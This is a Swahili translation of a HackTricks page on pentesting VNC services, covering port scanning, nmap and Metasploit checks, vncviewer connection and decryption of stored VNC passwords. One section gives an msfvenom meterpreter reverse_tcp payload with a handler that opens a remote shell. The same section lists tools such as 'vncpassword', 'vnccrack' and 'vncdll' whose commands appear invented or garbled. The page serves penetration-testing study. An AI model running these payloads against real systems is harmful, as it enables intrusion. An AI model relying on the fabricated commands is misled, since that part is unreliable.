# 5800,5801,5900,5901 - Pentesting VNC

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalam wa juu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

**Virtual Network Computing (VNC)** ni mfumo imara wa kushirikiana na kudhibiti kompyuta nyingine kwa kutumia itifaki ya **Remote Frame Buffer (RFB)**. Kwa kutumia VNC, watumiaji wanaweza kuingiliana kwa urahisi na kompyuta nyingine kwa kuhamisha matukio ya kibodi na panya kwa pande zote mbili. Hii inaruhusu ufikiaji wa wakati halisi na inasaidia msaada wa mbali au ushirikiano ufanisi kupitia mtandao.

VNC kawaida hutumia bandari **5800 au 5801 au 5900 au 5901.**
```
PORT    STATE SERVICE
5900/tcp open  vnc
```
## Uchambuzi

### VNC (Virtual Network Computing)

VNC ni itifaki ya mtandao inayotumiwa kudhibiti kompyuta kijijini. Inaruhusu mtumiaji kuona na kudhibiti skrini ya kompyuta nyingine kupitia mtandao. Kwa kawaida, VNC hutumia bandari 5900 kwa mawasiliano.

#### Kuchunguza VNC

Kuna njia kadhaa za kuchunguza ikiwa mfumo una VNC inayotumika:

- Tumia nmap kuangalia ikiwa bandari 5900 imefunguliwa:
```
nmap -p 5900 <IP>
```

- Tumia netcat kuangalia ikiwa mfumo unajibu kwenye bandari 5900:
```
nc -nvz <IP> 5900
```

#### Kuvunja VNC

Ikiwa VNC inapatikana na unataka kuvunja mfumo, unaweza kujaribu njia zifuatazo:

- Tumia msfvenom kuunda payload ya Metasploit:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > payload.exe
```

- Tumia Metasploit kuanzisha kikao cha kudhibiti kijijini:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```

- Tumia VNC kudhibiti kijijini:
```
vncviewer <IP>:<PORT>
```

#### Kuvuja VNC

Ikiwa unataka kuvuja habari kutoka kwa mfumo unaotumia VNC, unaweza kujaribu njia zifuatazo:

- Tumia VNCsnapshot kuokoa skrini ya kompyuta iliyodhibitiwa:
```
vncsnapshot <IP>:<PORT> snapshot.png
```

- Tumia VNCpassword kuokoa nywila iliyohifadhiwa kwenye mfumo:
```
vncpassword <IP>:<PORT>
```

- Tumia VNCrack kuvunja nywila ya VNC:
```
vnccrack -u <USER> -P <PASSWORD_FILE> <IP>:<PORT>
```

- Tumia VNCdll kuvunja nywila ya VNC:
```
vncdll <IP>:<PORT> <USER> <PASSWORD>
```

#### Vidokezo vya ziada

- Hakikisha kutumia nywila ngumu na yenye nguvu kwa VNC.
- Weka VNC upya kwa toleo la hivi karibuni ili kuepuka udhaifu uliojulikana.
```bash
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> <IP>
msf> use auxiliary/scanner/vnc/vnc_none_auth
```
### [**Kuvunja nguvu**](../generic-methodologies-and-resources/brute-force.md#vnc)

## Unganisha kwenye vnc ukitumia Kali
```bash
vncviewer [-passwd passwd.txt] <IP>::5901
```
## Kuvunja siri ya VNC

**Siri ya msingi imehifadhiwa** katika: \~/.vnc/passwd

Ikiwa una siri ya VNC na inaonekana imefichwa (baadhi ya herufi, kama ikiwa ni siri iliyofichwa). Inawezekana kuwa imefichwa kwa kutumia 3des. Unaweza kupata siri wazi ya nenosiri kwa kutumia [https://github.com/jeroennijhof/vncpwd](https://github.com/jeroennijhof/vncpwd)
```bash
make
vncpwd <vnc password file>
```
Unaweza kufanya hivi kwa sababu nenosiri linalotumiwa ndani ya 3des kwa kusimbua nywila za VNC za maandishi wazi liligeuzwa miaka iliyopita.\
Kwa **Windows** unaweza pia kutumia chombo hiki: [https://www.raymond.cc/blog/download/did/232/](https://www.raymond.cc/blog/download/did/232/)\
Nimehifadhi chombo hiki hapa pia kwa urahisi wa kupata:

{% file src="../.gitbook/assets/vncpwd.zip" %}

## Shodan

* `port:5900 RFB`

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
